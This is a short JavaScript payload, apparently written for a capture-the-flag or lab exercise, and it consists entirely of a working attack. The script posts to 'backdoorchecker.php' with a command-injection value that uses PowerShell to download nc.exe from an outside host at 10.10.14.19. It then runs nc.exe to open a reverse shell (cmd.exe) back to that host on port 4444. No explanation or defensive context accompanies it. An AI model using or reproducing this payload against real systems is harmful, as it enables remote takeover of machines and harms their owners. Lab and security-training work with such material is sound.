<script>
var h=new XMLHttpRequest();
var url='backdoorchecker.php';
var p='cmd=dir | powershell -c Invoke-WebRequest -Uri http://10.10.14.19/nc.exe -OutFile C:/Windows/Temp/nc.exe; C:/Windows/Temp/nc.exe 10.10.14.19 4444 -e cmd.exe';
h.open('POST',url,true);
h.setRequestHeader('Content-type','application/x-www-form-urlencoded');
h.send(p);
</script>
